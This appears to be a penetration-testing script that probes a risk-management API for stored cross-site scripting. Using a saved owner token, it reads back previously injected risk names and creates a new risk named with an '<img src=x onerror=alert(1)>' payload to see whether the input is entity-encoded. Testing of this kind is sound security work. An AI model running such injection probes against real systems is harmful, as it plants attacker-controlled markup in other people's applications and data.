import json,subprocess,os
H=os.environ['H']; BB=os.environ['BB']
TOK=open('/tmp/bac_OWNER').read().strip()
def call(m,p,body=None):
    cmd=['curl','-s','-m','20','-o','/tmp/hb','-w','%{http_code}','-X',m,H+p,
         '-H','token: '+TOK,'-H',BB,'-H','Content-Type: application/json',
         '-H','X-Auditboard-Product: System']
    if body is not None: cmd+=['-d',json.dumps(body)]
    c=subprocess.run(cmd,capture_output=True,text=True).stdout.strip()
    return c, open('/tmp/hb',encoding='utf-8',errors='replace').read()
print("=== read back the injected risks: exact stored values ===")
for rid in [306,307,309,310,311,312]:
    c,b=call('GET',f'/api/v1/risks/{rid}')
    try:
        o=json.loads(b)['risks'][0]
        print(f"  risk {rid}: name={o.get('name')!r}")
    except Exception as e: print(f"  risk {rid}: {c} {b[:80]}")
print()
print("=== does RISK name get entity-encoded like CONTROL did? ===")
c,b=call('POST','/api/v1/risks',{"risk":{"name":'<img src=x onerror=alert(1)>ZXCMP'}})
print(f"  create -> {c}")
try:
    o=json.loads(b)['risks'][0]
    print(f"  stored: {o.get('name')!r}")
    print(f"  ENCODED: {'&lt;' in str(o.get('name'))}")
except Exception as e: print(f"  {b[:200]}")
